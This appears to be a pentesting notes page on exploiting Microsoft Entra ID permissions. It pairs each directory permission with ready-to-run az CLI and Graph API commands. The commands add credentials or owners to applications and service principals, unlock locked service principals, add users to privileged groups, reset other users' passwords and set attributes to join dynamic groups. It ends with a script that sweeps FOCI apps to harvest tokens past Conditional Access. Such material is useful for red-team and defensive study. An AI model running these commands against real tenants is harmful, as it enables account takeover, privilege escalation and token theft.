---
title: "Entra ID Explotation"
order: 12
description: Explotation of Entra ID 
---

# Applications

## Reset app credential

> The action **microsoft.directory/applications/credentials/update** is needed. This allows an attacker to add credentials (passwords or certificates) to existing applications. If the application has privileged permissions, the attacker can authenticate as that application and gain those privileges. 
>
> The permission **microsoft.directory/applications.myOrganization/credentials/update** does the same but scoped to single-directory applications.

**Generate a new password without overwritting old ones**

```bash
az ad app credential reset --id "$APP_ID" --append
```

**Generate a new certificate without overwritting old ones**

```bash
az ad app credential reset --id "$APP_ID" --create-cert
```

## Set an application owner

> The permission **microsoft.directory/applications/owners/update** is required. By adding themselves as an owner, an attacker can manipulate the application, including credentials and permissions.

```bash
az ad app owner add --id <AppId> --owner-object-id <UserId>
az ad app credential reset --id <appId> --append
```

Then you can confirm the ownership with

```bash
az ad app owner list --id <appId>
```

# Service Principals

## 

> The permission **microsoft.directory/servicePrincipals/credentials/update** is required. This allows an attacker to add credentials to existing service principals. If the service principal has elevated privileges, the attacker can assume those privileges.
> The same can be done with **microsoft.directory/servicePrincipals/synchronizationCredentials/manage**

```bash
az ad sp credential reset --id <sp-id> --append
```

If you get the error "code":"CannotUpdateLockedServicePrincipalProperty","message":"Property passwordCredentials is invalid." it’s because it’s not possible to modify the passwordCredentials property of the SP and first you need to unlock it. For it you need a permission (microsoft.directory/applications/allProperties/update) that allows you to execute:

```bash
az rest --method PATCH --url https://graph.microsoft.com/v1.0/applications/<sp-object-id> --body '{"servicePrincipalLockConfiguration": null}'
```

## Add new SP owner

> The permission **microsoft.directory/servicePrincipals/owners/update** is needed. Similar to applications, this permission allows to add more owners to a service principal. Owning a service principal allows control over its credentials and permissions.

```bash
az rest --method POST \
  --uri "https://graph.microsoft.com/v1.0/servicePrincipals/$spId/owners/\$ref" \
  --headers "Content-Type=application/json" \
  --body "{
    \"@odata.id\": \"https://graph.microsoft.com/v1.0/directoryObjects/$userId\"
  }"

az ad sp credential reset --id <sp-id> --append
```

# Groups

## Add users to groups

> The permisssion **microsoft.directory/groups/members/update** is needed. This permission allows to add members to a group. An attacker could add himself or malicious accounts to privileged groups can grant elevated access.
> The same can be done with **microsoft.directory/groups/allProperties/update**

```bash
az ad group member add \
  --group entra-id-lab-3-privileged-group-9874cdaa \
  --member-id $USER_ID
```

## Set new group owners

> The permission **microsoft.directory/groups/owners/update** is required. This permission allows to become an owner of groups. An owner of a group can control group membership and settings, potentially escalating privileges to the group. This permission excludes Entra ID role-assignable groups.

```bash
az ad group owner add --group <GroupName> --owner-object-id <UserId>
az ad group member add --group <GroupName> --member-id <UserId>
```

# Users

## Reset the user's password

> The permission **microsoft.directory/users/password/update** is required. This permission allows to reset password to non-admin users, allowing a potential attacker to escalate privileges to other users. This permission cannot be assigned to custom roles.

```bash
az ad user update --id $userId --password "kweoifuh.234"
```

```bash
az rest --method PATCH \
  --uri "https://graph.microsoft.com/v1.0/users/$userId" \
  --headers "Content-Type=application/json" \
  --body "{
    \"passwordProfile\": {
      \"forceChangePasswordNextSignInWithMfa\": false,
      \"forceChangePasswordNextSignIn\": false,
      \"password\": \"kweoifuh.234\"
    }
  }"
```

## Modify user properties 

> The permission microsoft.directory/users/basic/update is needed. This privilege allows to modify properties of the user. It’s common to find dynamic groups that add users based on properties values, therefore, this permission could allow a user to set the needed property value to be a member to a specific dynamic group and escalate privileges.

```bash
az rest --method PATCH \
  --uri "https://graph.microsoft.com/v1.0/users/$victimUser" \
  --headers "Content-Type=application/json" \
  --body "{\"department\": \"security\"}"
```

# Get tokens

`AzureAppsSweep.py` tries authenticating against every Microsoft **FOCI (Family of Client IDs)** app with a single user/password. Each app that accepts the creds returns a token tied to the same identity but with different scopes, useful because Conditional Access usually targets specific apps, so one may be blocked while another goes through.

```bash
python AzureAppsSweep.py --username <email> --password <password> --outfile tokens.txt
```

`tokens.txt` ends up with `access_token`, `refresh_token` and `client_id` per app that authenticated.